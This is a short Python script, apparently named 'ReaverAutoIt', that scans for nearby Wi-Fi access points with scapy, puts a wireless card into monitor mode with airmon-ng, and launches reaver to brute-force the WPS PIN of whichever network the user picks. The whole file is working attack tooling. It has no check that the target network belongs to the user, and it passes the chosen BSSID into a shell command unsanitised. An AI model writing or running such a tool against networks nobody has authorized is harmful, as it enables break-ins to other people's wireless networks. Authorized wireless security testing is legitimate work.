#!/usr/bin/env python
import logging

import netifaces


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

ap_list = []
ap_name = []


def PacketHandler(packet):
    if packet.haslayer(Dot11):
        if packet.type == 0 and packet.subtype == 8:
            if packet.addr2.upper() not in ap_list:
                ap_list.append(packet.addr2.upper())
                ap_name.append(packet.info)
                print("BSSID: '%s' - ESSID: '%s'" % (packet.addr2.upper(), packet.info))


def PostNetworks():
    global ap_list, ap_name
    print("=" * 40)
    print("Scaning completed, %d network(s) found." % (len(ap_list)))

    lgth = len(ap_list)
    for i in range(0, lgth):
        print("ID: %d - (MAC/BSSID: %s, NAME/ESSID: %s)" % (i, ap_list[i], ap_name[i]))
    tnetwork = raw_input("Please enter the ID of the network that you wish to bruteforce: ")
    target = int(tnetwork)
    print("Starting Reaver...")
    os.system("reaver -i mon0 -b %s -w" % ap_list[target])


print("ReaverAutoIt - Reaver Automation Script")
print("Created by Elycin of Node Software.")
print("=" * 40)
print("Checking for a monitor mode enabled device...")
iflist = netifaces.interfaces()
if "mon0" in iflist:
    print("mon0 has been found, it will be used.")
    print("=" * 40)
    print("Scanning for wireless networks...")
    sniff(iface="mon0", prn=PacketHandler, timeout=10)
    PostNetworks()
else:
    print("Monitor mode has not been found.")
    if "wlan0" in iflist:
        subprocess.call("airmon-ng start wlan0", shell=True)
        print("Monitor mode has been enabled.")
        print("=" * 40)
        print("Scanning for wireless networks...")
        sniff(iface="mon0", prn=PacketHandler, timeout=10)
        PostNetworks()
    else:
        print("Unable to find a wireless adapter.")
        exit()
